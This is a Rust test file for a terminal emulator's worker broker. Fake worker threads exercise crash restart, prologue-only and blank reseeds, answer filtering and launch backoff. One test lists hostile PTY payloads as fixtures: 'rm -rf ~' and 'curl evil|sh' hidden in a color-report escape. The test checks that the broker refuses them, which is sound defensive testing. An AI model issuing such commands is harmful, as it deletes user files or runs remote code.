//! The broker against stand-in workers: threads that speak the worker's
//! own wire (`cmux_vt_worker::wire`) and parse nothing ([`ThreadLauncher`]).
//! The real worker, SIGKILLed, is in cmux-tui's `tests/vt_worker_restart.rs`.

use std::collections::HashMap;
use std::fs::File;
use std::io;
use std::net::Shutdown;
use std::os::fd::{AsRawFd, OwnedFd};
use std::os::unix::net::UnixStream;
use std::sync::mpsc::{Receiver, Sender, channel};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::{Duration, Instant};

use cmux_kitty_media::MediaRefusal;
use cmux_vt_worker::screen_page::{PageWriter, page_len_for};
use cmux_vt_worker::wire::{Command, Event, FrameReader, WIRE_VERSION, decode_command, send_event};
use ghostty_vt::KittyGraphicsLimits;

use super::*;

/// How long a test waits for an event before it fails.
const PATIENCE: Duration = Duration::from_secs(10);
/// The acceptance bound: a killed worker's shard is restored within it.
const RESTORE_BOUND: Duration = Duration::from_millis(100);
const GEOMETRY: Geometry = Geometry { cols: 80, rows: 24, cell_width: 8, cell_height: 16 };

/// How one stand-in worker behaves.
#[derive(Clone, Debug)]
struct FakeConfig {
    version: u16,
    sandbox: SandboxMechanism,
    /// Output offset whose parse crashes the worker.
    poison: Option<u64>,
    /// Answers sent while parsing each advance, before its PARSED:
    /// `(terminal, bytes)`, `None` for the advanced terminal.
    answers: Vec<(Option<u64>, Vec<u8>)>,
    /// Parsing any prologue crashes the worker.
    prologue_crashes: bool,
    /// Never sends HELLO and reads nothing.
    silent: bool,
    /// Sends HELLO, then reads nothing (a hung worker).
    hung: bool,
    /// Each advance needs a Kitty file read first.
    media: bool,
    /// Each ATTACH reports its page too small for this many bytes.
    page_too_small: Option<u64>,
    /// After each advance's PARSED, these events too (`None` ids are the
    /// advanced terminal's): a worker that breaks the bad_message rule.
    bad_events: Vec<Event>,
    /// On each DETACH, the events the detached attachment had in flight: a
    /// PARSED far ahead and a Kitty media request.
    late_after_detach: bool,
    /// Each ATTACH publishes a page that breaks the page layout.
    corrupt_page: bool,
}

impl Default for FakeConfig {
    fn default() -> Self {
        Self {
            version: WIRE_VERSION,
            sandbox: SandboxMechanism::None,
            poison: None,
            answers: Vec::new(),
            prologue_crashes: false,
            silent: false,
            hung: false,
            media: false,
            page_too_small: None,
            bad_events: Vec::new(),
            late_after_detach: false,
            corrupt_page: false,
        }
    }
}

/// A command a stand-in worker received.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Seen {
    Bootstrap { shard: usize, policy: SandboxPolicy },
    Attach { shard: usize, terminal: u64, start: u64, gap: bool, prologue: Vec<u8>, page_len: u64 },
    Advance { terminal: u64, end: u64 },
    Resize { terminal: u64, page_len: Option<u64> },
    Media { terminal: u64 },
}

fn wire_error(error: cmux_vt_worker::wire::WireError) -> io::Error {
    io::Error::other(error.to_string())
}

/// Serves one link as a worker would, until the link ends or the worker
/// "crashes" (`Err`).
fn serve(
    stream: &UnixStream,
    shard: usize,
    config: &FakeConfig,
    seen: &Sender<Seen>,
    stop: &Receiver<()>,
) -> io::Result<()> {
    let fd = stream.as_raw_fd();
    let mut reader = FrameReader::default();
    let mut parsed: HashMap<u64, u64> = HashMap::new();
    let mut frames: HashMap<u64, u64> = HashMap::new();
    let mut next_frame = |id: u64| {
        let frame = frames.entry(id).or_insert(0);
        *frame += 1;
        *frame
    };
    let mut waiting_media: HashMap<u64, u64> = HashMap::new();
    let mut bootstrapped = false;
    let crashes =
        |from: u64, to: u64| config.poison.is_some_and(|poison| (from..to).contains(&poison));
    loop {
        while let Some(frame) = reader.next_frame().map_err(wire_error)? {
            let command = decode_command(frame).map_err(wire_error)?;
            if !bootstrapped && !matches!(command, Command::Bootstrap(_)) {
                return Err(io::Error::other("the first frame was not BOOTSTRAP"));
            }
            match command {
                Command::Bootstrap(policy) => {
                    bootstrapped = true;
                    let _ = seen.send(Seen::Bootstrap { shard, policy });
                    let hello =
                        Event::Hello { version: config.version, sandbox: config.sandbox, pid: 0 };
                    send_event(fd, &hello)?;
                    if config.hung {
                        // Holds the link open and reads nothing more until killed.
                        let _ = stop.recv();
                        return Ok(());
                    }
                }
                Command::Attach(attach) => {
                    let _ = seen.send(Seen::Attach {
                        shard,
                        terminal: attach.id,
                        start: attach.start,
                        gap: attach.gap,
                        prologue: attach.prologue.clone(),
                        page_len: attach.page_len,
                    });
                    if config.prologue_crashes && !attach.prologue.is_empty() {
                        return Err(io::Error::other("poison prologue"));
                    }
                    parsed.insert(attach.id, attach.start);
                    if let Some(needed) = config.page_too_small {
                        send_event(fd, &Event::PageTooSmall { id: attach.id, needed })?;
                    }
                    if config.corrupt_page {
                        corrupt(attach.page, attach.page_len)?;
                    }
                    let frame = next_frame(attach.id);
                    send_event(fd, &Event::Parsed { id: attach.id, offset: attach.start, frame })?;
                }
                Command::Advance { id, end } => {
                    let _ = seen.send(Seen::Advance { terminal: id, end });
                    let from = parsed.get(&id).copied().unwrap_or(0);
                    if crashes(from, end) {
                        return Err(io::Error::other("poison"));
                    }
                    for (terminal, bytes) in &config.answers {
                        let event =
                            Event::PtyWrite { id: terminal.unwrap_or(id), bytes: bytes.clone() };
                        send_event(fd, &event)?;
                    }
                    if config.media {
                        waiting_media.insert(id, end);
                        send_event(fd, &Event::KittyMediaRequest { id, request: media_request() })?;
                        continue;
                    }
                    parsed.insert(id, end);
                    send_event(fd, &Event::Parsed { id, offset: end, frame: next_frame(id) })?;
                    for event in &config.bad_events {
                        send_event(fd, &retarget(event, id))?;
                    }
                }
                Command::KittyMedia { id, .. } => {
                    let _ = seen.send(Seen::Media { terminal: id });
                    if let Some(end) = waiting_media.remove(&id) {
                        parsed.insert(id, end);
                        send_event(fd, &Event::Parsed { id, offset: end, frame: next_frame(id) })?;
                    }
                }
                Command::Resize { id, page, .. } => {
                    let page_len = page.map(|(_, len)| len);
                    let _ = seen.send(Seen::Resize { terminal: id, page_len });
                }
                Command::Detach { id } => {
                    if config.late_after_detach {
                        let late = Event::Parsed { id, offset: 1 << 40, frame: 1 };
                        send_event(fd, &late)?;
                        send_event(fd, &Event::KittyMediaRequest { id, request: media_request() })?;
                    }
                }
                Command::Colors { .. } | Command::KittyLimits { .. } => {}
            }
        }
        if reader.fill(fd)? == 0 {
            return Ok(());
        }
    }
}

fn media_request() -> MediaRequest {
    MediaRequest {
        medium: FileMedium::File,
        name: b"L3RtcC9pbWFnZQ==".to_vec(),
        offset: 0,
        size: 0,
    }
}

/// `event` for terminal `id` when it names terminal 0.
fn retarget(event: &Event, id: u64) -> Event {
    let mut event = event.clone();
    match &mut event {
        Event::Parsed { id: of, .. }
        | Event::PtyWrite { id: of, .. }
        | Event::Title { id: of, .. }
        | Event::Pwd { id: of, .. }
        | Event::Bell { id: of, .. }
        | Event::Lapped { id: of, .. }
        | Event::PageTooSmall { id: of, .. }
        | Event::AttachFailed { id: of, .. }
        | Event::ProgramStatus { id: of, .. }
        | Event::KittyMediaRequest { id: of, .. } => {
            if *of == 0 {
                *of = id;
            }
        }
        Event::Hello { .. } => {}
    }
    event
}

/// Publish bytes that break the page layout into the worker's page.
fn corrupt(page: OwnedFd, len: u64) -> io::Result<()> {
    let len = usize::try_from(len).map_err(io::Error::other)?;
    let mut writer = PageWriter::open(page, len)?;
    let mut junk = vec![0xa5; 256];
    // The writer owns the sequence word.
    junk[8..16].fill(0);
    writer.publish(&junk);
    Ok(())
}

/// A stand-in worker on a thread. Its "kill" closes its end of the link,
/// which is what the kernel does when a worker process dies.
struct FakeProcess {
    stream: UnixStream,
    stop: Option<Sender<()>>,
    thread: Option<JoinHandle<()>>,
}

impl WorkerProcess for FakeProcess {
    fn pid(&self) -> u32 {
        0
    }

    fn kill(&mut self) {
        let _ = self.stream.shutdown(Shutdown::Both);
        self.stop = None;
    }

    fn reap(&mut self) {
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
    }
}

/// Launches [`FakeProcess`]es: launch `n` uses `configs[n]` (the last one
/// for every later launch) and sends the test a handle to kill it. The
/// first `failures` launches fail as a full process table does.
struct ThreadLauncher {
    configs: Vec<FakeConfig>,
    launches: usize,
    failures: usize,
    seen: Sender<Seen>,
    kills: Sender<(usize, UnixStream)>,
}

impl WorkerLauncher for ThreadLauncher {
    fn launch(&mut self, shard: usize) -> io::Result<LaunchedWorker> {
        if self.failures > 0 {
            self.failures -= 1;
            return Err(io::Error::from_raw_os_error(libc::EAGAIN));
        }
        let config = self.configs[self.launches.min(self.configs.len() - 1)].clone();
        self.launches += 1;
        let (ours, theirs) = UnixStream::pair()?;
        let stream = theirs.try_clone()?;
        let _ = self.kills.send((shard, theirs.try_clone()?));
        let seen = self.seen.clone();
        let (stop, stopped) = channel::<()>();
        let thread = std::thread::spawn(move || {
            if config.silent {
                let _ = stopped.recv();
                return;
            }
            let _ = serve(&theirs, shard, &config, &seen, &stopped);
            let _ = theirs.shutdown(Shutdown::Both);
        });
        Ok(LaunchedWorker {
            link: ours,
            process: Box::new(FakeProcess { stream, stop: Some(stop), thread: Some(thread) }),
        })
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum HostEvent {
    Parsed(VtTerminalKey, u64),
    Answer(VtTerminalKey, Vec<u8>),
    Page(VtTerminalKey, u64),
    Media(VtTerminalKey),
    Life(WorkerLifecycle),
}

type Reseeds = Arc<Mutex<HashMap<VtTerminalKey, Reseed>>>;

struct TestHost {
    reseeds: Reseeds,
    events: Sender<HostEvent>,
}

impl VtWorkerHost for TestHost {
    fn reseed(&mut self, terminal: VtTerminalKey) -> Option<Reseed> {
        self.reseeds.lock().expect("reseeds").get(&terminal).cloned()
    }

    fn write_answer(&mut self, terminal: VtTerminalKey, answer: &[u8]) {
        let _ = self.events.send(HostEvent::Answer(terminal, answer.to_vec()));
    }

    fn parsed(&mut self, terminal: VtTerminalKey, offset: u64) {
        let _ = self.events.send(HostEvent::Parsed(terminal, offset));
    }

    fn screen_page(&mut self, terminal: VtTerminalKey, page: &ScreenPage) {
        let _ = self.events.send(HostEvent::Page(terminal, page.len));
    }

    fn terminal_event(&mut self, _terminal: VtTerminalKey, _event: WorkerEvent) {}

    fn kitty_media(&mut self, terminal: VtTerminalKey, _request: MediaRequest, reply: MediaReply) {
        let _ = self.events.send(HostEvent::Media(terminal));
        reply.send(MediaAnswer::Refused(MediaRefusal::Forbidden));
    }

    fn lifecycle(&mut self, event: WorkerLifecycle) {
        let _ = self.events.send(HostEvent::Life(event));
    }
}

fn reseed(base: u64, oldest: u64, end: u64) -> Reseed {
    Reseed {
        prologue: Prologue { base, bytes: format!("\x1b[H\x1b[2Jscreen@{base}").into_bytes() },
        ring: RingSpan { oldest, end },
    }
}

fn spec(key: u64) -> VtTerminalSpec {
    VtTerminalSpec {
        key: VtTerminalKey(key),
        geometry: GEOMETRY,
        ring: OwnedFd::from(File::open("/dev/null").expect("open /dev/null")),
        ring_capacity: 1 << 20,
        scrollback: 1 << 20,
        kitty_limits: KittyGraphicsLimits::default(),
        colors: None,
        answered: 0,
    }
}

struct Harness {
    broker: VtWorkerBroker,
    reseeds: Reseeds,
    events: Receiver<HostEvent>,
    seen: Receiver<Seen>,
    kills: Receiver<(usize, UnixStream)>,
}

#[derive(Clone)]
struct Setup {
    shards: usize,
    configs: Vec<FakeConfig>,
    failures: usize,
    sandbox: WorkerSandbox,
    hello_timeout: Duration,
}

impl Setup {
    fn new(shards: usize, configs: Vec<FakeConfig>) -> Self {
        Self {
            shards,
            configs,
            failures: 0,
            sandbox: WorkerSandbox::unchecked(SandboxPolicy::Unsandboxed, SandboxMechanism::None),
            hello_timeout: PATIENCE,
        }
    }

    fn start(self, reseeds: HashMap<VtTerminalKey, Reseed>) -> Harness {
        let (events_tx, events) = channel();
        let (seen_tx, seen) = channel();
        let (kills_tx, kills) = channel();
        let launcher = ThreadLauncher {
            configs: self.configs,
            launches: 0,
            failures: self.failures,
            seen: seen_tx,
            kills: kills_tx,
        };
        let reseeds = Arc::new(Mutex::new(reseeds));
        let host = TestHost { reseeds: reseeds.clone(), events: events_tx };
        let config =
            BrokerConfig { shards: self.shards, queue: 64, hello_timeout: self.hello_timeout };
        let broker = VtWorkerBroker::start(
            config,
            self.sandbox,
            Box::new(launcher),
            Box::new(host),
            Box::new(Instant::now),
        )
        .expect("broker");
        Harness { broker, reseeds, events, seen, kills }
    }
}

fn harness(
    shards: usize,
    configs: Vec<FakeConfig>,
    reseeds: HashMap<VtTerminalKey, Reseed>,
) -> Harness {
    Setup::new(shards, configs).start(reseeds)
}

fn reseeds(keys: impl IntoIterator<Item = u64>, plan: Reseed) -> HashMap<VtTerminalKey, Reseed> {
    keys.into_iter().map(|key| (VtTerminalKey(key), plan.clone())).collect()
}

/// The first event `wanted` accepts; fails with every event seen when none
/// comes within [`PATIENCE`].
fn wait_for<T: std::fmt::Debug>(events: &Receiver<T>, mut wanted: impl FnMut(&T) -> bool) -> T {
    let deadline = Instant::now() + PATIENCE;
    let mut seen = Vec::new();
    while let Some(left) = deadline.checked_duration_since(Instant::now()) {
        match events.recv_timeout(left) {
            Ok(event) if wanted(&event) => return event,
            Ok(event) => seen.push(event),
            Err(_) => break,
        }
    }
    panic!("no wanted event within {PATIENCE:?}; saw {seen:#?}");
}

/// Every event up to and including the first `wanted` accepts.
fn until(
    events: &Receiver<HostEvent>,
    mut wanted: impl FnMut(&HostEvent) -> bool,
) -> Vec<HostEvent> {
    let mut seen = Vec::new();
    wait_for(events, |event| {
        seen.push(event.clone());
        wanted(event)
    });
    seen
}

fn life(
    events: &Receiver<HostEvent>,
    mut wanted: impl FnMut(&WorkerLifecycle) -> bool,
) -> WorkerLifecycle {
    match wait_for(events, |event| matches!(event, HostEvent::Life(life) if wanted(life))) {
        HostEvent::Life(life) => life,
        _ => unreachable!(),
    }
}

fn restored(events: &Receiver<HostEvent>, shard: usize) -> (ReseedMode, usize, Duration) {
    match life(events, |l| matches!(l, WorkerLifecycle::Restored { shard: s, .. } if *s == shard)) {
        WorkerLifecycle::Restored { mode, terminals, elapsed, .. } => (mode, terminals, elapsed),
        _ => unreachable!(),
    }
}

fn lost(events: &Receiver<HostEvent>) -> WorkerLifecycle {
    life(events, |l| matches!(l, WorkerLifecycle::Lost { .. }))
}

/// Waits for the restore that ends with all `count` attached terminals
/// parsed: the first worker may report a restore of the terminals that
/// attached before its HELLO, then one per later attach.
fn all_attached(events: &Receiver<HostEvent>, count: usize) {
    life(
        events,
        |l| matches!(l, WorkerLifecycle::Restored { terminals, .. } if *terminals == count),
    );
}

/// The attaches seen so far: `(terminal, start, gap, prologue empty)`.
fn attaches(seen: &Receiver<Seen>) -> Vec<(u64, u64, bool, bool)> {
    seen.try_iter()
        .filter_map(|seen| match seen {
            Seen::Attach { terminal, start, gap, prologue, .. } => {
                Some((terminal, start, gap, prologue.is_empty()))
            }
            _ => None,
        })
        .collect()
}

#[test]
fn bootstrap_comes_first_and_a_terminal_is_attached_with_its_prologue_ring_tail_and_page() {
    let h = harness(1, vec![FakeConfig::default()], reseeds([1], reseed(100, 40, 400)));
    h.broker.attach(spec(1));
    let first = wait_for(&h.seen, |_| true);
    assert_eq!(first, Seen::Bootstrap { shard: 0, policy: SandboxPolicy::Unsandboxed });
    let attach = wait_for(&h.seen, |seen| matches!(seen, Seen::Attach { .. }));
    let Seen::Attach { start, gap, prologue, page_len, .. } = attach else { unreachable!() };
    assert_eq!((start, gap), (100, false));
    assert_eq!(prologue, b"\x1b[H\x1b[2Jscreen@100");
    assert!(page_len >= page_len_for(GEOMETRY.cols, GEOMETRY.rows) as u64, "{page_len}");
    wait_for(&h.events, |event| *event == HostEvent::Page(VtTerminalKey(1), page_len));
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(1), 400));
    assert_eq!(restored(&h.events, 0).0, ReseedMode::Full);
    h.broker.advance(VtTerminalKey(1), 500);
    h.broker.advance(VtTerminalKey(1), 650);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(1), 650));
}

#[test]
fn a_killed_worker_is_replaced_and_its_16_terminals_restored_within_100_ms() {
    let h = harness(1, vec![FakeConfig::default()], reseeds(1..=16, reseed(100, 0, 400)));
    for key in 1..=16 {
        h.broker.attach(spec(key));
    }
    let (_, first) = wait_for(&h.kills, |_| true);
    all_attached(&h.events, 16);
    let killed = Instant::now();
    first.shutdown(Shutdown::Both).expect("kill the worker");
    let lost = lost(&h.events);
    assert!(
        matches!(
            &lost,
            WorkerLifecycle::Lost { cause: LinkEnd::Closed, deaths: 1, degraded, .. } if degraded.is_empty()
        ),
        "{lost:?}"
    );
    let (mode, terminals, _) = restored(&h.events, 0);
    let elapsed = killed.elapsed();
    assert_eq!((mode, terminals), (ReseedMode::Full, 16));
    assert!(elapsed < RESTORE_BOUND, "restored after {elapsed:?}");
    let reseeded = attaches(&h.seen).into_iter().filter(|seed| seed.1 == 100 && !seed.3).count();
    assert_eq!(reseeded, 32, "16 first seeds and 16 reseeds, each from the prologue");
}

#[test]
fn a_poison_pill_crashing_twice_in_10_s_restores_its_terminal_from_the_prologue_only() {
    let poisoned = FakeConfig { poison: Some(300), ..FakeConfig::default() };
    let mut plans = reseeds([1], reseed(100, 0, 400));
    plans.insert(VtTerminalKey(2), reseed(100, 0, 200));
    let h = harness(1, vec![poisoned], plans);
    // Its shard mate is parsed when the poisoned terminal joins.
    h.broker.attach(spec(2));
    all_attached(&h.events, 1);
    h.broker.attach(spec(1));
    let one = VtTerminalKey(1);
    for (deaths, degraded) in [(1, vec![]), (2, vec![(one, ReseedMode::PrologueOnly)])] {
        let event = lost(&h.events);
        assert!(
            matches!(&event, WorkerLifecycle::Lost { deaths: d, degraded: g, .. } if *d == deaths && *g == degraded),
            "{event:?}"
        );
    }
    // The prologue-only worker confirms the skipped tail, so the holder trims it.
    wait_for(&h.events, |event| *event == HostEvent::Parsed(one, 400));
    let (mode, terminals, _) = restored(&h.events, 0);
    assert_eq!((mode, terminals), (ReseedMode::PrologueOnly, 2));
    let seeds = attaches(&h.seen);
    let of = |terminal: u64| -> Vec<_> {
        seeds.iter().filter(|seed| seed.0 == terminal).map(|seed| (seed.1, seed.2)).collect()
    };
    assert_eq!(of(1), [(100, false), (100, false), (400, true)]);
    // Its shard mate was not parsing at either death: every reseed of it is
    // full, and it is seeded first.
    assert_eq!(of(2), [(100, false), (100, false), (100, false)]);
    assert_eq!(seeds.iter().map(|seed| seed.0).collect::<Vec<_>>(), [2, 1, 2, 1, 2, 1]);
}

#[test]
fn a_prologue_that_crashes_too_restores_a_blank_screen() {
    let poisoned = FakeConfig { prologue_crashes: true, ..FakeConfig::default() };
    let h = harness(1, vec![poisoned], reseeds([1], reseed(100, 0, 400)));
    h.broker.attach(spec(1));
    let (mode, terminals, _) = restored(&h.events, 0);
    assert_eq!((mode, terminals), (ReseedMode::Blank, 1));
    assert_eq!(
        attaches(&h.seen),
        [
            (1, 100, false, false),
            (1, 100, false, false),
            (1, 400, true, false),
            (1, 400, true, true)
        ]
    );
}

#[test]
fn poison_in_live_output_after_a_blank_reseed_hands_the_terminal_back_and_restarts_stop() {
    let poisoned = FakeConfig { poison: Some(1_000), ..FakeConfig::default() };
    let mut plans = reseeds([1], reseed(100, 0, 400));
    plans.insert(VtTerminalKey(2), reseed(100, 0, 200));
    let h = harness(1, vec![poisoned], plans);
    h.broker.attach(spec(1));
    h.broker.attach(spec(2));
    all_attached(&h.events, 2);
    let one = VtTerminalKey(1);
    // The program keeps printing the sequence that kills the parser.
    h.broker.advance(one, 1_100);
    let mut modes = Vec::new();
    for _ in 0..3 {
        match lost(&h.events) {
            WorkerLifecycle::Lost { degraded, .. } => {
                assert!(degraded.iter().all(|(key, _)| *key == one), "{degraded:?}");
                modes.push(degraded.first().map_or(ReseedMode::Full, |(_, mode)| *mode));
            }
            _ => unreachable!(),
        }
    }
    assert_eq!(modes, [ReseedMode::Full, ReseedMode::PrologueOnly, ReseedMode::Blank]);
    let handed = life(&h.events, |l| matches!(l, WorkerLifecycle::HandedBack { .. }));
    assert_eq!(
        handed,
        WorkerLifecycle::HandedBack {
            shard: Some(0),
            reason: HandBack::TerminalCrashing,
            terminals: vec![one]
        }
    );
    // Its shard mate keeps a worker; the poisoned stream starts no more.
    let (_, terminals, _) = restored(&h.events, 0);
    assert_eq!(terminals, 1);
    h.broker.advance(VtTerminalKey(2), 300);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(2), 300));
    drop(h.broker);
    let starts = h
        .events
        .try_iter()
        .filter(|event| matches!(event, HostEvent::Life(WorkerLifecycle::Started { .. })))
        .count();
    assert_eq!(starts, 0, "no launch after the restore that followed the hand back");
    let seeds = attaches(&h.seen);
    assert_eq!(seeds.iter().filter(|seed| seed.0 == 1).count(), 4, "{seeds:?}");
}

#[test]
fn only_answers_of_the_fixed_set_reach_the_pty_as_their_own_encoding() {
    let answers = vec![
        (None, b"\x1b[?62;22c\x1b[0n".to_vec()),
        (None, b"\x1bP>|ghostty 1.3.0\x1b\\".to_vec()),
        (None, b"\x1b[24;80R".to_vec()),
    ];
    let h = harness(
        1,
        vec![FakeConfig { answers, ..FakeConfig::default() }],
        reseeds([1], reseed(0, 0, 0)),
    );
    h.broker.attach(spec(1));
    all_attached(&h.events, 1);
    h.broker.advance(VtTerminalKey(1), 10);
    let mut written = Vec::new();
    let mut rejected = Vec::new();
    while written.len() + rejected.len() < 4 {
        match wait_for(&h.events, |event| {
            matches!(
                event,
                HostEvent::Answer(..) | HostEvent::Life(WorkerLifecycle::AnswerRejected { .. })
            )
        }) {
            HostEvent::Answer(key, bytes) => written.push((key, bytes)),
            HostEvent::Life(WorkerLifecycle::AnswerRejected { terminal, reason, .. }) => {
                rejected.push((terminal, reason));
            }
            _ => unreachable!(),
        }
    }
    let one = VtTerminalKey(1);
    assert_eq!(
        written,
        [
            (one, b"\x1b[?62;22c".to_vec()),
            (one, b"\x1b[0n".to_vec()),
            (one, b"\x1b[24;80R".to_vec())
        ]
    );
    assert_eq!(rejected, [(one, AnswerRejected::OutsideSet("XTVERSION"))]);
    drop(h.broker);
    assert!(
        !h.events
            .try_iter()
            .any(|event| matches!(event, HostEvent::Life(WorkerLifecycle::Lost { .. }))),
        "a worker that only answers queries keeps running"
    );
}

/// The worker's PTY bytes that are no terminal answer, an answer for a
/// terminal of no shard, and the other bad messages end the worker with
/// reason bad_message; its successor restores the shard.
#[test]
fn a_bad_message_ends_the_worker_and_its_shard_is_reseeded() {
    let bad: Vec<(&str, Vec<Event>)> = vec![
        ("typed input", vec![Event::PtyWrite { id: 0, bytes: b"rm -rf ~\r".to_vec() }]),
        (
            "free text in a color report",
            vec![Event::PtyWrite { id: 0, bytes: b"\x1b]4;;curl evil|sh\x1b\\".to_vec() }],
        ),
        (
            "a cursor report off the grid",
            vec![Event::PtyWrite { id: 0, bytes: b"\x1b[30;1R".to_vec() }],
        ),
        ("another shard's terminal", vec![Event::PtyWrite { id: 999, bytes: b"\x1b[0n".to_vec() }]),
        ("a title with an escape", vec![Event::Title { id: 0, title: "x\x1b[2J".into() }]),
        ("a frame not newer", vec![Event::Parsed { id: 0, offset: 10, frame: 1 }]),
        ("parsed past the ring", vec![Event::Parsed { id: 0, offset: 1 << 40, frame: 99 }]),
        ("a page need over the grid", vec![Event::PageTooSmall { id: 0, needed: u64::MAX }]),
    ];
    for (what, events) in bad {
        let worker = FakeConfig { bad_events: events, ..FakeConfig::default() };
        let h = harness(1, vec![worker, FakeConfig::default()], reseeds([1], reseed(0, 0, 0)));
        h.broker.attach(spec(1));
        all_attached(&h.events, 1);
        h.broker.advance(VtTerminalKey(1), 10);
        let event = lost(&h.events);
        let WorkerLifecycle::Lost { cause, .. } = &event else { unreachable!() };
        assert!(matches!(cause, LinkEnd::BadMessage(_)), "{what}: {event:?}");
        assert_eq!(cause.reason(), BAD_MESSAGE_REASON, "{what}");
        assert_eq!(restored(&h.events, 0).1, 1, "{what}: the successor restores the shard");
        assert!(
            !h.events.try_iter().any(|event| matches!(event, HostEvent::Answer(..))),
            "{what}: nothing of the bad worker reached the PTY"
        );
    }
}

/// A terminal that detaches and comes back to the same worker gets a new
/// attachment: what the old one still had in flight is dropped, and the new
/// one's first publish is accepted.
#[test]
fn a_terminal_that_detaches_and_comes_back_is_not_judged_by_its_old_attachment() {
    let worker = FakeConfig { late_after_detach: true, ..FakeConfig::default() };
    let h = harness(1, vec![worker], reseeds([1], reseed(0, 0, 0)));
    let one = VtTerminalKey(1);
    h.broker.attach(spec(1));
    all_attached(&h.events, 1);
    h.broker.advance(one, 10);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(one, 10));
    h.broker.detach(one);
    h.reseeds.lock().expect("reseeds").insert(one, reseed(0, 0, 20));
    h.broker.attach(spec(1));
    let attaches: Vec<_> = (0..2)
        .map(|_| match wait_for(&h.seen, |seen| matches!(seen, Seen::Attach { .. })) {
            Seen::Attach { terminal, .. } => terminal,
            _ => unreachable!(),
        })
        .collect();
    assert_eq!(attaches[0], 1);
    assert_ne!(attaches[1], 1, "the second attachment has its own wire id");
    h.broker.advance(one, 30);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(one, 30));
    drop(h.broker);
    let lost: Vec<_> = h
        .events
        .try_iter()
        .filter(|event| matches!(event, HostEvent::Life(WorkerLifecycle::Lost { .. })))
        .collect();
    assert!(lost.is_empty(), "{lost:?}");
}

#[test]
fn a_page_that_breaks_the_layout_ends_the_worker_when_it_is_read() {
    let worker = FakeConfig { corrupt_page: true, ..FakeConfig::default() };
    let h = harness(1, vec![worker, FakeConfig::default()], reseeds([1], reseed(0, 0, 0)));
    let one = VtTerminalKey(1);
    h.broker.attach(spec(1));
    all_attached(&h.events, 1);
    h.broker.page_checker().check(one);
    let event = lost(&h.events);
    assert!(
        matches!(
            &event,
            WorkerLifecycle::Lost { cause: LinkEnd::BadMessage(BadMessage::Page { .. }), .. }
        ),
        "{event:?}"
    );
}

#[test]
fn a_full_reseed_writes_no_answer_twice() {
    // The stand-in answers a DA query in every advance it parses.
    let answers = vec![(None, b"\x1b[?62;22c".to_vec())];
    let h = harness(
        1,
        vec![FakeConfig { answers, ..FakeConfig::default() }],
        reseeds([1], reseed(100, 0, 400)),
    );
    let one = VtTerminalKey(1);
    h.broker.attach(spec(1));
    let before = until(&h.events, |event| *event == HostEvent::Parsed(one, 400));
    let (_, first) = wait_for(&h.kills, |_| true);
    // The ring grew while the worker died: the successor replays 100..400,
    // already answered, then parses 400..600, not answered yet.
    h.reseeds.lock().expect("reseeds").insert(one, reseed(100, 0, 600));
    first.shutdown(Shutdown::Both).expect("kill the worker");
    let after = until(&h.events, |event| *event == HostEvent::Parsed(one, 600));
    drop(h.broker);
    let da = || HostEvent::Answer(one, b"\x1b[?62;22c".to_vec());
    let written: Vec<_> = before
        .into_iter()
        .chain(after)
        .filter(|event| matches!(event, HostEvent::Answer(..) | HostEvent::Parsed(..)))
        .collect();
    assert_eq!(
        written,
        [
            HostEvent::Parsed(one, 100),
            da(),
            HostEvent::Parsed(one, 400),
            da(),
            HostEvent::Parsed(one, 600)
        ],
        "the replay of 100..400 answers nothing; 400..600 answers once"
    );
    let advances: Vec<_> = h
        .seen
        .try_iter()
        .filter_map(|seen| match seen {
            Seen::Advance { end, .. } => Some(end),
            _ => None,
        })
        .collect();
    assert_eq!(advances, [400, 400, 600], "the replay stops where the old worker had answered");
}

#[test]
fn a_launch_that_fails_once_is_retried_and_the_shard_restores() {
    let mut setup = Setup::new(1, vec![FakeConfig::default()]);
    setup.failures = 1;
    let h = setup.start(reseeds([1], reseed(100, 0, 400)));
    h.broker.attach(spec(1));
    let failed = life(&h.events, |l| matches!(l, WorkerLifecycle::LaunchFailed { .. }));
    assert_eq!(
        failed,
        WorkerLifecycle::LaunchFailed {
            shard: 0,
            generation: 1,
            error: io::ErrorKind::WouldBlock,
            deaths: 1,
            restart: Restart::After(Duration::ZERO),
        }
    );
    // Each attempt has its own generation.
    let started = life(&h.events, |l| matches!(l, WorkerLifecycle::Started { .. }));
    assert!(matches!(started, WorkerLifecycle::Started { generation: 2, .. }), "{started:?}");
    assert_eq!(restored(&h.events, 0).1, 1);
    h.broker.advance(VtTerminalKey(1), 450);
    wait_for(&h.events, |event| *event == HostEvent::Parsed(VtTerminalKey(1), 450));
}

#[test]
fn a_shard_whose_launches_keep_failing_backs_off_then_hands_its_terminals_back() {
    let mut setup = Setup::new(1, vec![FakeConfig::default()]);
    setup.failures = usize::MAX;
    let h = setup.start(reseeds(1..=2, reseed(0, 0, 0)));
    h.broker.attach(spec(1));
    h.broker.attach(spec(2));
    let started = Instant::now();
    let mut events = until(&h.events, |event| {
        matches!(event, HostEvent::Life(WorkerLifecycle::HandedBack { .. }))
    });
    let Some(HostEvent::Life(handed)) = events.pop() else { unreachable!() };
    assert_eq!(
        handed,
        WorkerLifecycle::HandedBack {
            shard: Some(0),
            reason: HandBack::ShardCrashing,
            terminals: vec![VtTerminalKey(1), VtTerminalKey(2)],
        }
    );
    // 50 + 100 + ... + 1600 ms of backoff between the attempts.
    assert!(started.elapsed() >= Duration::from_millis(3_100), "{:?}", started.elapsed());
    let restarts: Vec<_> = events
        .into_iter()
        .filter_map(|event| match event {
            HostEvent::Life(WorkerLifecycle::LaunchFailed { restart, .. }) => Some(restart),
            _ => None,
        })
        .collect();
    assert_eq!(restarts.len(), SHARD_GIVE_UP, "{restarts:?}");
    assert_eq!(restarts.last(), Some(&Restart::GiveUp));
    // A later terminal finds no shard.
    h.broker.attach(spec(3));
    let handed = life(&h.events, |l| matches!(l, WorkerLifecycle::HandedBack { .. }));
    assert_eq!(
        handed,
        WorkerLifecycle::HandedBack {
            shard: None,
            reason: HandBack::NoShard,
            terminals: vec![VtTerminalKey(3)]
        }
    );
}

#[test]
